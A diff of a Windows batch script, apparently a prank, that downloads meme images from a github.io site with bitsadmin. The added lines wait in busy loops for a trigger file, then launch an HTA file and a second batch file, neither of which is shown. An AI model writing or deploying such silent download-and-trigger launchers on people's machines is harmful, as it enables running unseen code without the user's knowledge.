@@ -22,4 +22,16 @@ bitsadmin.exe /transfer "8" https://athdot.github.io/dwnld/8.png %USERPROFILE%\D
 bitsadmin.exe /transfer "9" https://athdot.github.io/dwnld/9.gif %USERPROFILE%\Desktop\MASTERFOLDER\mor.gif
 
 bitsadmin.exe /transfer "10" https://athdot.github.io/dwnld/10.jpg %USERPROFILE%\Desktop\MASTERFOLDER\trippymeme.jpg
-start %USERPROFILE%\Desktop\background.bat
+:start
+IF EXIST %USERPROFILE%\Downloads\activate.txt (
+start %USERPROFILE%\Desktop\MASTERFOLDER\Start.hta
+goto :check
+) ELSE (
+goto :start
+)
+:check
+IF EXIST %USERPROFILE%\Desktop\mains.bat (
+start %USERPROFILE%\Desktop\mains.bat
+exit
+)
+goto :check
